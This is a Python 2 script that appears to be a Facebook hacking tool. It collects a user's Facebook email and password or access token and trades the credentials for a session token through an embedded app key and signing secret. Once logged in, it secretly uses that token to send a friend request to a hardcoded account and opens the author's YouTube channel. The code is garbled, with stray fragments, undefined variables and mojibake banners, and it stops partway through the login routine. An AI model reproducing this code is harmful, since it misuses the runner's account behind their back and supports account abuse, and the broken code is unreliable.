#bao
!/usr//python2
#coding=utf-8
#The Credit For This Code Goes To MR-SH4DOW
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2020


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
def tokenz():
	os.system('clear')
	print logo
	toket = raw_input("\033[1;97m[+] Token :")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		menu()
	except KeyError:
		print "\033[1;91m[!] Wrong"
		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
		
b.write(a['access_token'])
		b.close()
		print '[*] successfully generate access token'
		print '[*] Your access token is stored in cookie/token.log'
		menu()
	except KeyError:
		print '[!] Failed to generate access token'
		print '[!] Check your connection / email or password'
		os.remove('cookie/token.log')
		menu()
	except requests.exceptions.ConnectionError:
		print '[!] Failed to generate access token'
		print '[!] Connection error !!!'
		os.remove('cookie/token.log')
		menu()

def phone():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')		

#Dev:BADAMALA 302-BOYS
##### LOGO #####
logo = """
\033[1;91mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;92mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;93mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;94mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;95mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;96mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв
\033[1;97mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;97mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;96mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;95mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;94mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;93mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;92mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;91mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;91mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;92mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;93mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€
\033[1;94mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в”Ђв–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв–€в–€в–€в–€в–€в–€
\033[1;95mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;96mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;97mв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;97mв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв–€в”Ђв”Ђв–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
\033[1;96mв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;95mв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;94mв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;93mв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;92mв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
\033[1;91mв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€
\033[1;92mв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
\033[1;93mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€
\033[1;94mв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–€в–€в–€в–€в–€в–€в–€  
\033[1;91mвЂўв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”ЂвЂў
        💪💪💪 BILALO DADX 💪💪💪
\033[1;91mв–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в•—  в–€в–€в•— в–€в–€в–€в–€в–€в•— в–€в–€в–€в–€в–€в–€в•—  в–€в–€в–€в–€в–€в–€в•— в–€в–€в•—    в–€в–€в•—
\033[1;95mв–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•‘  в–€в–€в•‘в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв•ђв–€в–€в•—в–€в–€в•‘    в–€в–€в•‘
\033[1;94mв–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘ в–€в•— в–€в–€в•‘
\033[1;96mв•љв•ђв•ђв•ђв•ђв–€в–€в•‘в–€в–€в•”в•ђв•ђв–€в–€в•‘в–€в–€в•”в•ђв•ђв–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘в–€в–€в•‘   в–€в–€в•‘в–€в–€в•‘в–€в–€в–€в•—в–€в–€в•‘
\033[1;93mв–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘в–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в–€в–€в–€в•”в•ќв•љв–€в–€в–€в•”в–€в–€в–€в•”в•ќ
\033[1;92mв•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ђв•ђв•ђв•ќ  в•љв•ђв•ђв•ќв•љв•ђв•ђв•ќ 
                                                   

\033[1;91mвЂўв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”ЂвЂў
\033[1;97mвЂў-----------------\033[1;37mDSRK-STORM\033[1;97m-----------------вЂў
 \033[1;97mвЂўв–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…
\033[1;41m\033[1;37m[вљЎрџ”Ґ\033[1;37mAuthor Name: BIALALO рџ”ҐвљЎ\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[вљЎрџ”Ґ\033[1;37mвЏ в†’new chanel рџ”ҐвљЎ\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[вљЎрџ”Ґ\033[1;37mYT Channel: BIALO”ҐвљЎ\033[1;37m]\033[1;0m
\033[1;41m\033[1;37m[вљЎрџ”Ґ \033[1;37mFrom:https://github.com/Badamala302/Zilesha”ҐвљЎ\033[1;37m]\033[1;0m
\033[1;97mвЂўв–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…
\033[1;97mвЂў-----------------\033[1;37mBadamala-302\033[1;97m-----------------вЂў
"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mBadamala 302в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–€в–’в–’в–’в–’в–’в–’в–’в–’..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91mв”Ђв”Ђв”Ђв–„в–Ђв–Ђв–Ђв–Ђв–Ђв”Ђв”Ђв”Ђв–„в–€в–Ђв–Ђв–Ђв–€в–„
\033[1;92mв”Ђв”Ђв–ђв–„в–„в–„в–„в–„в–„в–„в–„в–€в–€в–Њв–Ђв–„в–Ђв–ђв–€в–€
\033[1;93mв”Ђв”Ђв–ђв–’в–’в–’в–’в–’в–’в–’в–’в–€в–€в–€в–Њв–Ђв–ђв–€в–€в–€
\033[1;94mв”Ђв”Ђв”Ђв–Њв–’в–“в–’в–’в–’в–’в–“в–’в–€в–€в–Њв–Ђв–ђв–€в–€
\033[1;95mв”Ђв”Ђв”Ђв–Њв–“в–ђв–Ђв–Ђв–Ђв–Ђв–Њв–“в”Ђв–Ђв–Ђв–Ђв–Ђв–Ђ  
\033[1;97mвЂўв–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…
\033[1;97mвЂўв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”ЂвЂў
\033[1;91mв”Ђв”Ђв”Ђв”Ђв”Ђв–€в”Ђв–„в–Ђв–€в”Ђв”Ђв–€в–Ђв–„в”Ђв–€в”Ђв”Ђв”Ђв”Ђв”Ђ\033[1;97mв”Ђв”Ђв”Ђв”Ђв”Ђв–€в”Ђв–„в–Ђв–€в”Ђв”Ђв–€в–Ђв–„в”Ђв–€в”Ђв”Ђв”Ђв”Ђв”Ђ 
\033[1;91mв”Ђв”Ђв”Ђв”Ђв–ђв–Њв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–ђв–Њв”Ђв”Ђв”Ђв”Ђ\033[1;97mв”Ђв”Ђв”Ђв”Ђв–ђв–Њв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв–ђв–Њв”Ђв”Ђв”Ђв”Ђ
\033[1;91mв”Ђв”Ђв”Ђв”Ђв–€в–Њв–Ђв–„в”Ђв”Ђв–„в–„в”Ђв”Ђв–„в–Ђв–ђв–€в”Ђв”Ђв”Ђв”Ђ\033[1;97mв”Ђв”Ђв”Ђв”Ђв–€в–Њв–Ђв–„в”Ђв”Ђв–„в–„в”Ђв”Ђв–„в–Ђв–ђв–€в”Ђв”Ђв”Ђв”Ђ
\033[1;91mв”Ђв”Ђв”Ђв–ђв–€в–€в”Ђв”Ђв–Ђв–Ђв”Ђв”Ђв–Ђв–Ђв”Ђв”Ђв–€в–€в–Њв”Ђв”Ђв”Ђ\033[1;97mв”Ђв”Ђв”Ђв–ђв–€в–€в”Ђв”Ђв–Ђв–Ђв”Ђв”Ђв–Ђв–Ђв”Ђв”Ђв–€в–€в–Њв”Ђв”Ђв”Ђ
\033[1;91mв”Ђв”Ђв–„в–€в–€в–€в–€в–„в”Ђв”Ђв–ђв–Њв”Ђв”Ђв–„в–€в–€в–€в–€в–„в”Ђв”Ђ\033[1;97mв”Ђв”Ђв–„в–€в–€в–€в–€в–„в”Ђв”Ђв–ђв–Њв”Ђв”Ђв–„в–€в–€в–€в–€в–„в”Ђв”Ђ    
\033[1;97mвЂўв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”ЂвЂў                                                                                                                             

\033[1;96m  _______
 \033[1;95m| |  | |/ /\ \ |  _  /_____/_/    \_\_|  \_\_|\_\    
                                 
                                 
           
\033[1;92mвЂўв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”ЂвЂў
 \033[1;97mвЂўв–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…в–…
 """
CorrectUsername = "islamo"
CorrectPassword = "bilalo"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Username \x1b[1;91m: \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m[+] \033[1;91m \x1b[1;91mTool Password \x1b[1;91m: \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:DARK-STORM-BOYS
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;97mWrong Password"
            os.system('xdg-open https://www.youtube.com/c/UCQdBT_TMMD3l6CrS6JxiUSQ')
    else:
        print "\033[1;97mWrong Username"
        os.system('xdg-open https://www.youtube.com/c/UCQdBT_TMMD3l6CrS6JxiUSQ')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo
	print "\033[1;91m[1]\033[1;47m\033[1;31mLogin With Facebook              \033[1;0m"
        time.sleep(0.05)
        print "\033[1;92m[2]\033[1;47m\033[1;31mLogin With Token                 \033[1;0m"
        time.sleep(0.05)
        print "\033[1;93m[3]\033[1;47m\033[1;31mDownload Token App               \033[1;0m"
        time.sleep(0.05)
        print "\033[1;94m[4]\033[1;47m\033[1;31mSubscribe Usman Tech      \033[1;0m"
        time.sleep(0.05)
	print "\033[1;95m[5]\033[1;47m\033[1;31mJoin Whatsapp group For Help           \033[1;0m"
        time.sleep(0.05)
        print "\033[1;96m[0]\033[1;47m\033[1;31mExit                             \033[1;0m"
	time.sleep(0.05)
	pilih_login()
def pilih_login():
	peak = raw_input("\n\033[1;97m[+] \033[0;31mSelect Option: \033[1;91m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
        elif peak =="4":
	        os.system('xdg-open https://www.youtube.com/c/UCQdBT_TMMD3l6CrS6JxiUSQ')
	        login()
        elif peak =="5":
	        os.system('xdg-open https://chat.whatsapp.com/ ')
                login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()
def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo                
		print "\033[1;97mвЂў-----------------\033[1;37mDARK-STORM\033[1;97m-----------------вЂў"
		print('\033[1;97m[+]\033[1;47m\033[1;31mLOGIN WITH FACEBOOK\x1b[1;97m \033[1;0m' )
		print('	' )
		id = raw_input('\033[1;97m[!] \x1b[1;97mNumber/Email\x1b[1;97m: \x1b[1;97m')
		pwd = raw_input('\033[1;97m[+] \x1b[1;97mPassword\x1b[1;97m    : \x1b[1;97m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\033[1;47m\033[1;91mDARK-STORM Login Successful\033[1;0m'
				os.system('xdg-open https://www.youtube.com/c/UCQdBT_TMMD3l6CrS6JxiUSQ')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mв€†CPв€† Creat A New Account")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
			
